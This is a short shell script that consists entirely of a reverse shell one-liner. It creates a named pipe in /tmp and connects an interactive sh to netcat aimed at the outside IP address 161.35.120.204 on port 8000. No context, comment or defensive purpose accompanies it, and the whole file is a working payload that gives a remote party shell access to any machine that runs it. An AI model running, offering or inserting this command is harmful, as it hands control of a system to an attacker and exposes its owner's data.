#!/bin/sh

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 161.35.120.204 8000 >/tmp/f;
